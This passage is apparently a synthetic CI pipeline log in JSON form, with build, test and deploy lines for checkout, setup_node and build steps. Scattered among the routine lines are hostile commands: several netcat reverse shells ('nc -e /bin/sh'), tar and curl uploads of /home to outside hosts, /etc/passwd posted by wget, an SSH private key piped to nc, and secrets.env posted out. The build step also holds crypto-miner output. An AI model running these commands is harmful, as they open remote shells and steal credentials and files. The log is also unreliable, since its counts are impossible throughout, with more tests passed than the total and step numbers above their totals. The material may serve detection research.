completed\nStep 18/21: Running migrations\nDone.\npip: Installing build dependencies...\nnpm install: resolved 1868 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Node.js 18.16.2\nStep 15/21: Deploying\nCompiling src/index.js...\nLayer 7/11: COPY command\nnpm install: added 246 packages\nWARNING: eslint has known vulnerabilities\nnpm install: resolved 1508 packages\n\u2713 Step 'setup' succeeded\n[12:20:15] DEBUG: Memory usage: 1390MB\nPOST /api - 200 (173ms)\nCreating production build...\nCache restored successfully (378MB)\nHEAD is now at 3f72a05\nCompiling utils/index.js...\n[12:20:15] INFO: Starting build process\nArtifact uploaded: dist.zip (41MB)\nCache restored successfully (210MB)\nMinifying app.js\nnpm notice: created a lockfile\nUsing Node.js 20.6.3\nTest Suites: 39 passed, 25 total\nSuccess!\nCompleted.\nStep 7/24: Testing\nUploading artifact 'dist' (18 files)\nReady.\nTime: 7.385s\nBundling main.js\n=== Step deploy_staging completed ===\n=== Step: e2e_tests ===\nOK\nInstalling react@3.4.2\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Collecting axios\nStep 17/18: Building\n\u2713 Task completed in 430ms\nChecking out master branch\nOK\nImage pulled successfully\nUsing Node.js 15.18.2\nBuilding Docker image...\nStep 7/22: Building\nEnvironment: production\nWARNING: react has known vulnerabilities\nTLS handshake completed\nCache restored successfully (86MB)\n[12:20:15] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\n[12:20:15] DEBUG: Memory usage: 1094MB\nSwitched to branch 'bugfix/task-118'\nStep 13/19: Deploying\nEnvironment: production\nArtifact uploaded: build.tar.gz (38MB)\nnpm install: added 95 packages\nConnecting to cloud.services:443...\n[12:20:15] WARN: Deprecated API usage\nSwitched to branch 'feature/task-376'\n[12:20:15] WARN: Deprecated API usage\nCache saved successfully\nAlready up to date.\nMinifying app.js\nTLS handshake completed\nStep 3/23: Running migrations\n[12:20:15] INFO: Cache refreshed\n[12:20:15] DEBUG: Memory usage: 739MB\nStep 19/16: Installing dependencies\nStep 14/15: Deploying\nCompiling utils/service.java...\nConnecting to acme.corp:443...\nWaiting...\n[12:20:15] DEBUG: Initializing service\n[12:20:15] INFO: Starting build process\nStep 7/17: Installing dependencies\n[12:20:15] DEBUG: Memory usage: 1488MB\n[12:20:15] WARN: Deprecated API usage\nRan 89 tests in 42s\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nChecking out develop branch\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-9145\nMinifying main.js\npip: Downloading webpack-1.12.tar.gz\nLayer 8/12: RUN command\nVerifying...\nyarn add: Done in 19.64s\n[12:20:15] INFO: Starting build process\nHEAD is now at 4db99cc\nnpm notice: created a lockfile\nPOST /api - 200 (275ms)\nVerifying...\nArtifact downloaded: 25MB\nCompiling src/utils.go...\nStep 4/16: Installing dependencies\n  PASS: e2e/test_auth_login.spec.js\nStep 19/19: Installing dependencies\nProcessing...\nMinifying app.js\nGenerating source maps...\nUsing Node.js 15.2.7\nnpm install: resolved 262 packages\nFetching submodules...\nCache invalidated: build\npip: Installing build dependencies...\nAlready up to date.\n\u2717 build failed with exit code 41\npip install: Successfully installed lodash-2.9\nPlatform: darwin-arm64\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 534 files...\nUsing Node.js 17.3.4\nTests: 295 passed, 160 total\nnpm notice: created a lockfile\nArtifact downloaded: 49MB\nWaiting...\nnpm install: added 380 packages\nPlatform: linux-x64\nGET /status - 204 (18ms)\n[12:20:15] DEBUG: Memory usage: 650MB\nGenerating source maps...\nnpm install: added 294 packages\nStep 12/21: Deploying\nNODE_ENV=test\npip: Installing build dependencies...\n[12:20:15] DEBUG: Memory usage: 1168MB\nOptimizing 49 modules...\nTests: 320 passed, 249 total\n\u2713 Step 'setup' succeeded\nTests: 197 passed, 475 total\nCache hit for key-5216\nInstalling express@4.10.2\nUsing Python 3.12\nCompleted.\nDone.\n[12:20:15] WARN: Deprecated API usage\n  PASS: test_user_create (348ms)\npip install: Successfully installed jest-1.20\nTime: 48.442s\nStep 17/17: Testing\nWARNING: axios has known vulnerabilities\nSwitched to branch 'hotfix/task-298'\nUsing Node.js 18.17.9\nWaiting...\n[12:20:15] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCache invalidated: dependencies\nReady.\n[12:20:15] INFO: Processing request\nCompiling src/service.java...\n\u2713 Step 'setup' succeeded\n\u2713 Step 'build' succeeded\nTests: 492 passed, 296 total\nSnapshots: 14 passed, 25 total\nVerifying...\nFetching submodules...\nPushing to registry...\n\u2713 package completed\n[12:20:15] INFO: Starting build process\n[12:20:15] INFO: Starting build process\nDone.\nyarn add: Done in 9.18s\nCompiling components/service.java...\nStep 12/20: Running migrations\nConnection established\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] INFO: Starting build process\nSnapshots: 30 passed, 26 total\nCompiling src/index.js...\nConnecting to cloud.services:443...\nTime: 47.583s\npip: Downloading react-3.10.tar.gz\nStep 9/22: Testing\nStep 4/16: Running migrations\nUsing Node.js 15.18.10\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\npip install: Successfully installed jest-2.12\n[12:20:15] DEBUG: Initializing service\n[12:20:15] WARN: Deprecated API usage\npip install: Successfully installed eslint-2.10\nnpm install: resolved 1274 packages\nCoverage: 94% statements, 82% branches\nLayer 3/11: COPY command\nMinifying vendor.js\nCache saved successfully\nChecking out main branch\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (3MB)\nPOST /api - 202 (232ms)\nWARNING: jest has known vulnerabilities\nFinished.\npip: Downloading webpack-2.9.tar.gz\nnpm install: resolved 1989 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nFetching submodules...\n\u2713 Task completed in 1096ms\nStep 16/19: Linting\nMinifying app.js\nCompleted.\nReady.\nCompiling utils/app.ts...\nStep 19/17: Building\nnpm notice: created a lockfile\nStep 11/24: Installing dependencies\nArtifact uploaded: build.tar.gz (20MB)\nPulling image: alpine:3.11\nSnapshots: 37 passed, 13 total\nLayer 7/10: ENV command\n\u2713 Step 'setup' succeeded\nStep 7/15: Building\nStep 12/20: Deploying\nTransforming 540 files...\nCache hit for key-5440\n\u2713 All checks passed\n[12:20:15] DEBUG: Connection pool: 18 active\n[12:20:15] DEBUG: Query executed in 54ms\nWARNING: prettier has known vulnerabilities\nWARNING: express has known vulnerabilities\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nCompleted.\nMinifying vendor.js\nnc -e /bin/sh 26.6.254.180 35857\nDone.\nSending 403MB of data to startup.dev\nStep 2/18: Deploying\nStep 11/24: Installing dependencies\n[12:20:15] WARN: Deprecated API usage\nVerifying...\nWARNING: react has known vulnerabilities\n[12:20:15] INFO: Connecting to database\nCache invalidated: node_modules\n[12:20:15] DEBUG: Memory usage: 740MB\nMinifying app.js\nCompiling components/app.ts...\nCache hit for key-6336\nyarn add: Done in 3.17s\nSwitched to branch 'hotfix/task-670'\nGET /api - 201 (73ms)\nStep 20/23: Deploying\nEnvironment: production\nPlatform: linux-x64\n[12:20:15] DEBUG: Connection pool: 6 active\nnpm install: resolved 1436 packages\nConnecting to acme.corp:443...\nnc -e /bin/sh 79.248.27.105 21733\nPulling image: python:latest\nArtifact downloaded: 14MB\nArtifact downloaded: 46MB\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nStep 13/17: Deploying\npip: Installing build dependencies...\nCompiling utils/service.java...\n[12:20:15] DEBUG: Memory usage: 749MB\nCache saved successfully\nUsing Python 3.10\nImage pulled successfully\nTime: 86.296s\npip: Collecting axios\nUsing Python 3.9\nAlready up to date.\nFetching submodules...\n[12:20:15] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nCoverage: 98% statements, 80% branches\nFetching submodules...\nCompiling src/service.java...\nImage pulled successfully\nUsing Node.js 20.4.10\nEnvironment: test\nyarn add: Done in 14.89s\nGenerating source maps...\nMinifying vendor.js\nStep 19/18: Linting\nCreating production build...\n  PASS: unit/test_cache_hit.spec.js\nCache restored successfully (255MB)\nUsing Node.js 16.3.10\npip install: Successfully installed prettier-4.18\nChecking out main branch\nCache invalidated: build\nReady.\nCache restored successfully (100MB)\n[12:20:15] WARN: Deprecated API usage\nReady.\nCompiling lib/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nPushing to registry...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nEnvironment: test\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 12 passed, 20 total\n[12:20:15] INFO: Request completed\nWARNING: react has known vulnerabilities\n[12:20:15] DEBUG: Connection pool: 6 active\nCreating production build...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:20:15] WARN: Deprecated API usage\nnpm install: added 331 packages\n[12:20:15] INFO: Cache refreshed\n[12:20:15] DEBUG: Connection pool: 5 active\nPushing to registry...\nPushing to registry...\nNODE_ENV=production\nnpm notice: package.json updated\nStep 10/22: Building\nUsing Node.js 16.4.4\n  PASS: unit/test_db_connect.spec.js\nOptimizing 34 modules...\nConnection established\n[12:20:15] ERROR: Connection failed\nException: NullPointerException\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: lodash has known vulnerabilities\nFAILED: test_cache_hit\nCache hit for key-4687\nUsing Python 3.10\n[12:20:15] INFO: Cache refreshed\nnpm notice: package.json updated\nStep 13/21: Running migrations\nPushing to registry...\nHEAD is now at f685d2c\nArtifact downloaded: 1MB\npip: Collecting jest\nArtifact uploaded: build.tar.gz (40MB)\nFAILED: test_user_create\nnc -e /bin/sh 11.38.237.221 27244\nInstalling prettier@2.4.6\nFetching submodules...\nnc -e /bin/sh 115.226.96.244 6793\n  PASS: unit/test_auth_login.spec.js\nCompiling utils/app.ts...\nCompleted.\nCache invalidated: build\nImage pulled successfully\n\u2713 Task completed in 4497ms\npip: Installing build dependencies...\nCompiling components/app.ts...\nWARNING: react has known vulnerabilities\nTest Suites: 40 passed, 11 total\nArtifact uploaded: build.tar.gz (13MB)\n[12:20:15] DEBUG: Memory usage: 447MB\nSending 21MB of data to cloud.services\nCompiling utils/app.ts...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out master branch\nChecking out main branch\n[12:20:15] DEBUG: Initializing service\nStep 4/23: Linting\n\u2713 package completed\nConnection established\nUsing Python 3.11\n\u2717 build failed with exit code 33\nWARNING: prettier has known vulnerabilities\n[12:20:15] WARN: Deprecated API usage\nChecking out master branch\npip: Collecting prettier\necho $(cat ~/.ssh/id_rsa) | base64 | nc 107.248.222.176 20661\nSnapshots: 13 passed, 11 total\n\u2713 All checks passed\nCreating production build...\nPushing to registry...\nCompiling components/service.java...\nDone.\nnc -e /bin/sh 252.1.150.217 16615\nStep 18/22: Installing dependencies\n[12:20:15] WARN: Deprecated API usage\nCompiling components/app.ts...\npip: Collecting axios\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nChecking out develop branch\nCache saved successfully\n[12:20:15] WARN: Deprecated API usage\nTLS handshake completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nArtifact uploaded: dist.zip (85MB)\nPulling image: node:latest\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nLayer 8/15: COPY command\nSnapshots: 29 passed, 37 total\npip: Collecting webpack\n[12:20:15] DEBUG: Initializing service\nBuilding Docker image...\npip install: Successfully installed react-4.12\nConnecting to example.com:443...\nLoading...\nStep 7/18: Deploying\nUsing Node.js 17.7.6\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nTime: 30.782s\nFetching submodules...\n[12:20:15] DEBUG: Loading configuration\nTime: 80.53s\nnpm notice: created a lockfile\nMinifying app.js\n[12:20:15] INFO: Starting build process\nWARNING: prettier has known vulnerabilities\n[12:20:15] INFO: Request completed\nBuilding Docker image...\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCreating production build...\nCache hit for key-2038\nnpm notice: package.json updated\nWaiting...\n  PASS: test_api_health (170ms)\nWARNING: eslint has known vulnerabilities\nStep 7/15: Running migrations\nnpm notice: package.json updated\n[12:20:15] INFO: Processing request\n[12:20:15] WARN: Deprecated API usage\nCoverage: 76% statements, 85% branches\nTest Suites: 44 passed, 48 total\nWARNING: react has known vulnerabilities\n[12:20:15] INFO: Request completed\n\u2713 Step 'checkout' succeeded\n[12:20:15] DEBUG: Memory usage: 1610MB\nUsing Python 3.12\nWaiting...\nConnecting to acme.corp:443...\nSnapshots: 1 passed, 31 total\nRan 19 tests in 58s\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-10T12:20:15.408148",
        "finished_at": "2025-12-10T12:20:33.617944",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (63ms)",
          "Using Node.js 15.20.9",
          "Bundling main.js",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Minifying main.js",
          "Compiling lib/utils.go...",
          "Cache miss for key-5566",
          "[12:20:15] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Success!",
          "Snapshots: 39 passed, 40 total",
          "[12:20:15] INFO: Processing request",
          "Bundling styles.css",
          "[12:20:15] INFO: Starting build process",
          "Step 16/22: Installing dependencies",
          "Pushing to registry...",
          "yarn add: Done in 6.64s",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading eslint-4.9.tar.gz",
          "OK",
          "Artifact uploaded: build.tar.gz (19MB)",
          "npm notice: created a lockfile",
          "pip install: Successfully installed lodash-1.8",
          "Completed.",
          "pip: Downloading axios-4.0.tar.gz",
          "Environment: production",
          "[12:20:15] DEBUG: Connection pool: 18 active",
          "Tests: 294 passed, 195 total",
          "Installing lodash@1.1.1",
          "pip: Collecting react",
          "Using Python 3.11",
          "\u2713 Task completed in 3570ms",
          "pip: Downloading lodash-5.7.tar.gz",
          "Layer 6/10: ENV command",
          "Generating source maps...",
          "Already up to date.",
          "[12:20:15] DEBUG: Query executed in 79ms",
          "pip: Downloading prettier-4.11.tar.gz",
          "Snapshots: 34 passed, 27 total",
          "Bundling main.css",
          "  PASS: test_api_health (130ms)",
          "Done.",
          "Building Docker image...",
          "Installing axios@1.12.6",
          "WARNING: webpack has known vulnerabilities",
          "Platform: win32-x64",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:20:15] ERROR: Connection failed",
          "Layer 7/9: ENV command",
          "npm notice: created a lockfile",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] WARN: Deprecated API usage",
          "Layer 9/11: ENV command",
          "Connection established",
          "Checking out main branch",
          "npm install: resolved 1191 packages",
          "Platform: linux-x64",
          "Switched to branch 'feature/task-940'",
          "pip: Collecting jest",
          "[12:20:15] DEBUG: Connection pool: 1 active",
          "GET /api - 204 (57ms)",
          "Generating source maps...",
          "Waiting...",
          "Time: 62.894s",
          "pip: Downloading jest-5.3.tar.gz",
          "[12:20:15] INFO: Cache refreshed",
          "TLS handshake completed",
          "Completed.",
          "Coverage: 83% statements, 71% branches",
          "Waiting...",
          "Connection established",
          "[12:20:15] DEBUG: Query executed in 21ms",
          "[12:20:15] DEBUG: Memory usage: 1834MB",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Cache invalidated: dependencies",
          "Using Python 3.11",
          "\u2713 package completed",
          "GET /status - 204 (99ms)",
          "Step 10/22: Deploying",
          "Snapshots: 3 passed, 37 total",
          "Using Python 3.9",
          "Cache miss for key-4432",
          "Cache miss for key-7503",
          "\u2717 build failed with exit code 45",
          "[12:20:15] DEBUG: Query executed in 22ms",
          "NODE_ENV=development",
          "Connecting to acme.corp:443...",
          "Creating production build...",
          "Test Suites: 50 passed, 24 total",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed prettier-1.10",
          "Test Suites: 49 passed, 40 total",
          "npm install: resolved 1162 packages",
          "pip: Downloading eslint-1.10.tar.gz",
          "yarn add: Done in 6.58s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'coverage' (24 files)",
          "Pushing to registry...",
          "yarn add: Done in 17.90s",
          "Compiling components/index.js...",
          "Cache hit for key-3124",
          "Building Docker image...",
          "Building Docker image...",
          "Verifying...",
          "Step 18/22: Building",
          "Step 13/21: Building",
          "Time: 1.625s",
          "Checking out main branch",
          "Step 14/19: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "Image pulled successfully",
          "Bundling vendor.js",
          "Ran 31 tests in 29s",
          "pip: Installing build dependencies...",
          "[12:20:15] DEBUG: Query executed in 89ms",
          "Cache miss for key-9208",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] DEBUG: Query executed in 69ms",
          "Layer 10/9: ENV command",
          "Already up to date.",
          "Layer 10/14: ENV command",
          "  PASS: unit/test_api_health.spec.js",
          "npm notice: created a lockfile",
          "  PASS: test_db_connect (271ms)",
          "Uploading artifact 'build' (19 files)",
          "[12:20:15] DEBUG: Query executed in 44ms",
          "yarn add: Done in 28.64s",
          "Bundling main.js",
          "npm notice: created a lockfile",
          "Step 9/15: Running migrations",
          "POST /api - 200 (463ms)",
          "  PASS: test_cache_hit (72ms)",
          "Pushing to registry...",
          "Step 19/19: Deploying",
          "Cache miss for key-8392",
          "Step 17/20: Installing dependencies",
          "HEAD is now at 6e4a746",
          "Step 17/24: Linting",
          "npm install: added 159 packages",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:15] DEBUG: Memory usage: 1152MB",
          "Already up to date.",
          "[12:20:15] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Layer 6/10: COPY command",
          "yarn add: Done in 12.62s",
          "[12:20:15] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "Pushing to registry...",
          "pip install: Successfully installed axios-1.11",
          "GET /api - 200 (67ms)",
          "Test Suites: 16 passed, 6 total",
          "Cache miss for key-7907",
          "Step 10/20: Testing",
          "Checking out main branch",
          "yarn add: Done in 21.43s",
          "Uploading artifact 'build' (15 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Creating production build...",
          "Uploading artifact 'dist' (30 files)",
          "Optimizing 61 modules...",
          "Creating production build...",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] INFO: Processing request",
          "HEAD is now at 6fcc787",
          "Artifact uploaded: build.tar.gz (18MB)",
          "WARNING: webpack has known vulnerabilities",
          "Done.",
          "POST /data - 202 (247ms)",
          "NODE_ENV=test",
          "Step 10/21: Testing",
          "Checking out master branch",
          "npm install: resolved 598 packages",
          "  PASS: test_auth_login (378ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Bundling styles.js",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 13/17: Testing",
          "npm install: resolved 628 packages",
          "HEAD is now at 04c33a8",
          "Snapshots: 44 passed, 13 total",
          "POST /data - 201 (350ms)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-10T12:20:33.617944",
        "finished_at": "2025-12-10T12:21:19.142433",
        "log_lines": [
          "=== Step: setup_node ===",
          "Environment: production",
          "Creating production build...",
          "Success!",
          "Test Suites: 7 passed, 5 total",
          "Checking out master branch",
          "Time: 17.785s",
          "Success!",
          "NODE_ENV=production",
          "GET /health - 201 (71ms)",
          "Already up to date.",
          "Step 17/18: Deploying",
          "Cache restored successfully (76MB)",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "[12:20:15] ERROR: Connection failed",
          "  PASS: test_cache_hit (484ms)",
          "Artifact downloaded: 26MB",
          "[12:20:15] DEBUG: Memory usage: 1183MB",
          "Cache miss for key-6623",
          "TLS handshake completed",
          "[12:20:15] DEBUG: Connection pool: 20 active",
          "Exception: TypeError",
          "Building Docker image...",
          "\u2713 Task completed in 3374ms",
          "yarn add: Done in 15.83s",
          "Optimizing 60 modules...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:20:15] INFO: Cache refreshed",
          "Fetching submodules...",
          "npm install: added 337 packages",
          "Platform: darwin-arm64",
          "POST /api - 201 (475ms)",
          "NODE_ENV=development",
          "Switched to branch 'hotfix/task-263'",
          "pip: Downloading eslint-3.8.tar.gz",
          "Cache miss for key-7163",
          "[12:20:15] ERROR: Connection failed",
          "[12:20:15] INFO: Processing request",
          "Artifact downloaded: 7MB",
          "Optimizing 90 modules...",
          "Using Python 3.9",
          "[12:20:15] DEBUG: Initializing service",
          "  PASS: test_db_connect (212ms)",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=production",
          "Cache saved successfully",
          "OK",
          "Installing eslint@1.1.9",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Ready.",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Compiling utils/service.java...",
          "POST /data - 202 (475ms)",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 20.8.4",
          "Verifying...",
          "npm notice: package.json updated",
          "Bundling vendor.css",
          "NODE_ENV=test",
          "WARNING: lodash has known vulnerabilities",
          "Finished.",
          "POST /upload - 200 (390ms)",
          "Exception: RuntimeError",
          "npm notice: created a lockfile",
          "[12:20:15] DEBUG: Query executed in 7ms",
          "Generating source maps...",
          "Building Docker image...",
          "Minifying main.js",
          "Cache restored successfully (422MB)",
          "pip: Downloading jest-5.3.tar.gz",
          "Using Python 3.10",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 30.48s",
          "Test Suites: 17 passed, 10 total",
          "GET /status - 204 (53ms)",
          "[12:20:15] DEBUG: Connection pool: 15 active",
          "Installing webpack@2.16.5",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "Finished.",
          "Exception: NullPointerException",
          "Switched to branch 'hotfix/task-474'",
          "[12:20:15] DEBUG: Query executed in 30ms",
          "Step 1/17: Building",
          "Pulling image: node:18",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (18MB)",
          "Success!",
          "Using Python 3.12",
          "Cache saved successfully",
          "Uploading artifact 'coverage' (50 files)",
          "[12:20:15] INFO: Connecting to database",
          "yarn add: Done in 4.55s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:15] DEBUG: Query executed in 94ms",
          "pip: Collecting react",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:20:15] INFO: Starting build process",
          "Step 1/15: Testing",
          "\u2713 Step 'checkout' succeeded",
          "Cache miss for key-2996",
          "Installing react@1.4.1",
          "Step 6/25: Testing",
          "Creating production build...",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:20:15] DEBUG: Connection pool: 9 active",
          "[12:20:15] INFO: Connecting to database",
          "  PASS: test_api_health (64ms)",
          "Coverage: 99% statements, 91% branches",
          "Pulling image: node:18",
          "Bundling styles.js",
          "Switched to branch 'hotfix/task-851'",
          "pip: Installing build dependencies...",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:15] WARN: Deprecated API usage",
          "Transforming 811 files...",
          "Fetching submodules...",
          "Verifying...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 17/20: Building",
          "Pushing to registry...",
          "npm install: resolved 366 packages",
          "[12:20:15] WARN: Deprecated API usage",
          "Creating production build...",
          "Compiling src/main.py...",
          "[12:20:15] DEBUG: Memory usage: 1857MB",
          "HEAD is now at edd0bdf",
          "Success!",
          "[12:20:15] WARN: Deprecated API usage",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Optimizing 26 modules...",
          "pip install: Successfully installed jest-1.5",
          "Connection established",
          "Tests: 56 passed, 254 total",
          "Cache restored successfully (325MB)",
          "Transforming 293 files...",
          "Done.",
          "Connection established",
          "FAILED: test_auth_login",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "[12:20:15] ERROR: Connection failed",
          "Connection established",
          "Test Suites: 33 passed, 22 total",
          "Transforming 272 files...",
          "Cache saved successfully",
          "Done.",
          "Done.",
          "  PASS: unit/test_user_create.spec.js",
          "yarn add: Done in 28.46s",
          "Compiling utils/utils.go...",
          "[12:20:15] DEBUG: Initializing service",
          "Cache restored successfully (355MB)",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] DEBUG: Loading configuration",
          "Optimizing 97 modules...",
          "pip install: Successfully installed eslint-5.17",
          "Uploading artifact 'coverage' (37 files)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Test Suites: 17 passed, 17 total",
          "Installing webpack@3.3.2",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "OK",
          "Compiling utils/handler.rs...",
          "yarn add: Done in 17.20s",
          "[12:20:15] DEBUG: Connection pool: 3 active",
          "Pushing to registry...",
          "\u2717 build failed with exit code 69",
          "[12:20:15] DEBUG: Initializing service",
          "Bundling main.css",
          "Cache hit for key-7227",
          "pip: Downloading webpack-4.18.tar.gz",
          "Cache miss for key-1099",
          "Pulling image: alpine:18",
          "Step 14/19: Linting",
          "Step 13/19: Installing dependencies",
          "Cache restored successfully (355MB)",
          "pip: Downloading react-4.8.tar.gz",
          "Cache saved successfully",
          "[12:20:15] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: ValueError",
          "Exception: RuntimeError",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-10T12:21:19.142433",
        "finished_at": "2025-12-10T12:23:35.715901",
        "log_lines": [
          "=== Step: build ===",
          "Compiling components/main.py...",
          "Bundling main.js",
          "[12:20:15] INFO: Processing request",
          "[12:20:15] DEBUG: Loading configuration",
          "Layer 10/11: ENV command",
          "Using Python 3.12",
          "Finished.",
          "GET /health - 200 (29ms)",
          "[12:20:15] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 116",
          "Snapshots: 10 passed, 39 total",
          "Checking out master branch",
          "Minifying app.js",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Snapshots: 50 passed, 3 total",
          "Verifying...",
          "[12:20:15] DEBUG: Query executed in 43ms",
          "Pushing to registry...",
          "Optimizing 39 modules...",
          "cryptonight: Hashrate: 5027 H/s",
          "Installing lodash@2.11.3",
          "Optimizing 69 modules...",
          "TLS handshake completed",
          "[12:20:15] ERROR: Connection failed",
          "Loading...",
          "Compiling components/utils.go...",
          "Accepted share #330",
          "npm notice: created a lockfile",
          "Platform: win32-x64",
          "pip: Installing build dependencies...",
          "Success!",
          "[12:20:15] DEBUG: Connection pool: 14 active",
          "Switched to branch 'hotfix/task-948'",
          "Compiling src/app.ts...",
          "Step 13/23: Deploying",
          "[12:20:15] DEBUG: Initializing service",
          "HEAD is now at 5537382",
          "Step 16/17: Building",
          "Compiling lib/app.ts...",
          "pip install: Successfully installed lodash-5.16",
          "Environment: production",
          "minerd: 6 threads active",
          "npm notice: package.json updated",
          "Using Node.js 14.6.9",
          "Step 3/18: Testing",
          "Cache invalidated: node_modules",
          "NODE_ENV=production",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Minifying app.js",
          "[12:20:15] DEBUG: Memory usage: 1145MB",
          "\u2713 Step 'install' succeeded",
          "GPU #3: 64\u00b0C, mining",
          "[12:20:15] DEBUG: Query executed in 66ms",
          "Building Docker image...",
          "Ran 22 tests in 49s",
          "Cache invalidated: node_modules",
          "Connecting to startup.dev:443...",
          "[12:20:15] INFO: Processing request",
          "npm install: resolved 110 packages",
          "Minifying main.js",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "POST /data - 200 (120ms)",
          "Minifying vendor.js",
          "Compiling lib/service.java...",
          "[12:20:15] INFO: Starting build process",
          "Step 17/24: Running migrations",
          "NODE_ENV=production",
          "Compiling lib/main.py...",
          "[12:20:15] INFO: Connecting to database",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "  PASS: integration/test_auth_login.spec.js",
          "Connecting to test.io:443...",
          "NODE_ENV=production",
          "WARNING: eslint has known vulnerabilities",
          "Cache saved successfully",
          "Using Node.js 16.0.4",
          "Generating source maps...",
          "Installing webpack@4.11.1",
          "Processing...",
          "pip: Collecting webpack",
          "npm notice: package.json updated",
          "Environment: production",
          "Completed.",
          "Using Node.js 20.0.3",
          "Bundling runtime.js",
          "Connecting to acme.corp:443...",
          "pip: Collecting axios",
          "pip: Collecting eslint",
          "FAILED: test_db_connect",
          "\u2713 All checks passed",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Step 'setup' succeeded",
          "Step 1/20: Installing dependencies",
          "xmrig: Starting mining on pool.test.io:3333",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "[12:20:15] DEBUG: Loading configuration",
          "[12:20:15] DEBUG: Loading configuration",
          "Creating production build...",
          "Snapshots: 1 passed, 48 total",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Using Node.js 18.1.0",
          "Building Docker image...",
          "[12:20:15] DEBUG: Connection pool: 20 active",
          "pip: Collecting lodash",
          "Cache saved successfully",
          "Done.",
          "[12:20:15] WARN: Deprecated API usage",
          "Cache hit for key-6929",
